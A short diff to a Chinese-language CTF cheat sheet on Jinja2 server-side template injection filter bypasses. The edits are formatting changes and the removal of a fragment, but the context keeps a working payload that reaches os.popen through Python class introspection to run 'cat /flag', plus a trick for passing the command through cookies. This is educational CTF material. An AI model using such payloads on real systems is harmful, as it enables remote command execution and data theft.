@@ -114,9 +114,9 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤大括号
 
-使用\{%%\}替代\{{}}，payload:
+使用`{%%}`替代`{{}}`，payload:
 
-```
+```markdown
 {% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) %}
 ```
 
@@ -136,8 +136,6 @@ file、subprocess.Popen、os.popen、exec、eval
 
   3.使用 cookies 传参，如 request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag
   ```
-
-  也可将下划线进行
 
 - ## 过滤数字
 
